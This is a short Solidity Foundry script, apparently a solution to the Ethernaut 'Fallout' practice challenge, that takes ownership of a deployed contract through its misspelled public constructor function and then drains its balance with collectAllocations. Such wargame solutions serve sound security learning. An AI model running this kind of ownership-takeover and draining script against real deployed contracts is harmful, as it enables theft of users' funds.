//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../../src/fallout/Fallout.sol";

contract FalloutAttack is Script {
     function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        Fallout fallout = Fallout(0xBC6Cc13FB4d874fcDe29261A2F7fBdDA8dBb8640);
        fallout.Fal1out{value: 1 wei}();
        fallout.collectAllocations();
        vm.stopBroadcast();
     }
}
